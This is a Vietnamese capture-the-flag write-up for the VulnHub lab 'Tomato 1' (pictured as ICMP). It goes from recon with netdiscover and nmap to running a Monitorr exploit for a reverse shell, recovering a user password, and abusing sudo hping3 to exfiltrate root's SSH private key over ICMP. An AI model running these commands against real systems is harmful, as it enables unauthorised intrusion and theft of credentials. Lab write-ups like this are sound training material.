# LAB10: TOMATO 1
```
https://www.vulnhub.com/entry/tomato-1,557/
```
## Chuẩn bị
* Kali linux: 10.22.1.109

![image](https://user-images.githubusercontent.com/92532460/224657456-98f780f2-fe91-4744-9fad-b55df693d630.png)

* Máy victim: ICMP

![image](https://user-images.githubusercontent.com/92532460/224626308-f41b29bf-27e0-4398-ab9b-a82aedeaafc3.png)

## Xác định mục tiêu
* Dùng lệnh netdiscover để quét tìm IP máy victim
```
netdiscover -i eth0 -r 10.22.1.0/24
```
![image](https://user-images.githubusercontent.com/92532460/224657751-c64a9a29-8c7f-4f68-89bd-e4f8fbc86f21.png)

* Tiếp theo, tôi quét các cổng đang mở trên máy mục tiêu để có kiến thức về các dịch vụ tiếp xúc trên máy mục tiêu.
```
nmap -sV -sS -p- 10.22.1.108  
```

![image](https://user-images.githubusercontent.com/92532460/224657938-2609bddf-9bea-4926-98c6-4fb9d7b24be4.png)

* Từ kết quả quét Nmap, chúng ta có thể thấy rằng máy chủ HTTP có ứng dụng web Monitorr.
## Liệt kê máy chủ web
* Trang chủ của máy chủ sẽ chuyển hướng đến trang sau.

![image](https://user-images.githubusercontent.com/92532460/224658156-d5c47c95-0250-45bd-8195-4d5b88e4834f.png)

* Từ hình ảnh trên, chúng ta có thể thấy liên kết đến kho lưu trữ của ứng dụng web. Hơn nữa, chúng ta cũng có thể xem phiên bản của ứng dụng. Trong Kali Linux của tôi, tôi đã tìm kiếm bất kỳ khai thác nào của Monitorr, tôi đã tìm thấy một khai thác cho cùng một phiên bản.
```
searchsploit monitorr
```

![image](https://user-images.githubusercontent.com/92532460/224658340-740f1839-b29e-4c18-b88e-2486dcc7ecb5.png)

* Tôi có thể sao chép trực tiếp khai thác vào thư mục làm việc của mình trong Kali Linux. Tuy nhiên, nếu bạn đang ở trong một bản phân phối khác, bạn có thể tải xuống mã từ khai thác-db.

```
searchsploit -m 48980
```
![image](https://user-images.githubusercontent.com/92532460/224658595-dd210a47-820c-4604-a307-dc6a6c474350.png)

* Tôi đã kiểm tra tập lệnh và nó yêu cầu LHOST và LPORT tạo ra một trình bao đảo ngược. Do đó, tôi đã nghe cổng 9001 cho nó.
```
nc -nlvp 9001
```
* Sau đó, tôi thực thi tập lệnh khai thác.
```
python3 48980.py http://10.22.1.108/mon/ 10.22.1.109 9001
```

![image](https://user-images.githubusercontent.com/92532460/224659471-f81d4fee-baec-496b-895e-64fc880377d4.png)

* Điều này đã cho tôi một vỏ ngược.

## Nâng cấp đặc quyền người dùng
* Sau khi tôi có chỗ đứng trong hệ thống, tôi đã kiểm tra những người dùng của nó.
```
grep sh /etc/passwd
```
![image](https://user-images.githubusercontent.com/92532460/224660017-147fc7de-1d99-4202-bf27-49293344035e.png)

* Ở đây, chúng ta có thể thấy một người dùng tên là fox. Vì vậy, chúng ta có thể kiểm tra các tệp bên trong thư mục chính.
```
cd /home/fox/
ls -al
```
![image](https://user-images.githubusercontent.com/92532460/224660390-a33d674d-560f-417d-a9e2-435744eedce2.png)

* Có một tệp "reminder" nói rằng mã hóa được thực hiện với một tệp crypt.php. Tiếp theo, có một thư mục phát triển có quyền thực thi đối với những người dùng khác, nhưng không có quyền đọc/ghi. Do đó, chúng ta có thể đoán rằng tệp có thể nằm trong thư mục.
```
ls -l devel/encrypt.php
```

![image](https://user-images.githubusercontent.com/92532460/224661009-9ffa4a2c-d9dd-48ce-ba03-7af3292f6fbb.png)

* Tệp có quyền đọc đối với tất cả người dùng.
* Khi mở tệp, chúng ta có thể thấy một văn bản được mã hóa bằng khóa 'da'. Tôi đã thử đăng nhập bằng mật khẩu này cho người dùng cáo, nó đã hoạt động.
```
cat devel/encrypt.php
```
![image](https://user-images.githubusercontent.com/92532460/224661259-9b460612-1ec3-448c-aba1-4e410d78e8ae.png)
* Thực hiện ssh vào tài khoản fox với mật khẩu vừa tìm được
```
ssh fox@10.22.1.108
```
![image](https://user-images.githubusercontent.com/92532460/224661900-1db2d14e-d598-4598-b4f8-a6b9e7e948ab.png)

## Nâng cấp đặc quyền root
* Tiếp theo, tôi đã kiểm tra quyền sudo của người dùng.

![image](https://user-images.githubusercontent.com/92532460/224662525-198bd764-6d23-41cf-aba9-b4477f9db804.png)

* Bây giờ chúng ta cần thêm hai terminal vào máy của nạn nhân. Một terminal gửi và một terminal nhận.

Đây là thiết terminal đầu tiên. Nhấn Ctrl+C khi terminal thứ hai nhận được tất cả dữ liệu khóa riêng.
```
sudo hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa
```
* Đây là terminal thứ hai.
```
sudo hping3 --icmp 127.0.0.1 --listen signature --safe
```
![image](https://user-images.githubusercontent.com/92532460/224668114-f626dbf2-a9b9-4076-9371-d4213bdba6ed.png)

* Tạo file id_rsa và lưu khóa private lại

![image](https://user-images.githubusercontent.com/92532460/224668849-2454e4e5-aeb6-493f-87fe-f98a20100010.png)
* Phân lại quyền cho file id_rsa
```
chmod 600 id_rsa
```

* Bây giờ chúng ta có thể ssh vào với quyền root.
```
ssh root@10.22.1.108 -i id_rsa
```
![image](https://user-images.githubusercontent.com/92532460/224670317-22e964d5-3888-4cf4-947c-fa32d314ca6a.png)

* Thực hiện nâng cấp đặc quyền lên root thành công !
